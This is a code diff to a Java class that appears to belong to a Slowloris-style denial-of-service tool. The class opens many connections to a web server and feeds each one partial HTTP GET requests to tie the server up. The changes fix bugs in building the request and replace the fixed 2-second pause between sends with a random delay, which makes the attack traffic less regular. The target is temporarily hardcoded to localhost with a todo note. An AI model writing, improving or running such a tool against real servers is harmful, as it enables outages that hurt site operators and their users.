@@ -25,7 +25,9 @@ public class Connector implements Runnable
     {
         this.serverPort = serverPort;
         this.attackSeconds = attackSeconds;
-        allPartialRequests = createIntialPartialRequests();
+        String targetPrefix = target.startsWith("http://") ? "" : "http://";
+        targetURL = new URL(targetPrefix + target);
+        allPartialRequests = createInitialPartialRequests();
 
         for(int i = 0; i < NUMBER_OF_CONNECTIONS; i++)
             initConnection(i);
@@ -35,10 +37,10 @@ public class Connector implements Runnable
      * creates the initial partial requests that are sent to the server
      * @return a string array containing all the partial HTTP GET requests for every connection this Connector manages
      */
-    private String[] createIntialPartialRequests()
+    private String[] createInitialPartialRequests()
     {
         String pagePrefix = "/";
-        if(targetURL.getHost().startsWith("/"))
+        if(targetURL.getPath().startsWith("/"))
             pagePrefix = "";
 
         String type = "GET " + pagePrefix + targetURL.getPath() + " HTTP/1.1\r\n";
@@ -77,7 +79,8 @@ public class Connector implements Runnable
     {
         try
         {
-            allSockets[index] = new Socket(InetAddress.getByName(targetURL.toString()), serverPort);
+            allSockets[index] = new Socket(InetAddress.getByName("localhost"), serverPort); // todo: check, make program parse localhost properly
+            //allSockets[index] = new Socket(InetAddress.getByName(targetURL.toString()), serverPort); // todo: check
         }
         catch(IOException ioe)
         {
@@ -96,7 +99,7 @@ public class Connector implements Runnable
             sendPartialRequest(i);
             try
             {
-                Thread.sleep(2000);
+                Thread.sleep(new Random().nextInt(2138));
             }
             catch(InterruptedException ie)
             {
